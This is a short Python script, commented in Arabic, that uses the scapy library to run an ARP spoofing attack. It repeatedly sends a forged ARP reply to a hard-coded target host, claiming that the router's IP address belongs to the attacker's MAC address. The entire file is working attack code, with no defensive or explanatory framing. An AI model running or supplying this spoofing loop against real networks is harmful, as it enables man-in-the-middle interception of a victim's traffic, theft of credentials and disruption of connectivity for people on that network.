from scapy.all import ARP, Ether, send
import time

def arp_spoof(target_ip, spoof_ip, target_mac, spoof_mac):
    """
    تنفيذ هجوم ARP Spoofing
    
    :param target_ip: عنوان IP للجهاز المستهدف.
    :param spoof_ip: عنوان IP الذي سيتم التظاهر بأنه.
    :param target_mac: عنوان MAC للجهاز المستهدف.
    :param spoof_mac: عنوان MAC الذي سيتم التظاهر بأنه.
    """
    # رسالة ARP مزيفة للجهاز المستهدف
    arp_response = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac, hwsrc=spoof_mac)
    
    while True:
        send(arp_response, verbose=False)
        print(f"Spoofed ARP response sent to {target_ip} with IP {spoof_ip} as {spoof_mac}")
        time.sleep(2)

if __name__ == "__main__":
    target_ip = "192.168.1.9"  # عنوان IP المستهدف
    spoof_ip = "192.168.1.1"   # عنوان IP الذي سيتم التظاهر بأنه (عنوان الراوتر)
    
    target_mac = "c8:58:c0:29:b4:a4"  # استبدل هذا بعنوان MAC للجهاز المستهدف
    spoof_mac = "00:0c:29:36:24:08"  # عنوان MAC الخاص بك (أو أي عنوان MAC تود استخدامه)

    arp_spoof(target_ip, spoof_ip, target_mac, spoof_mac)
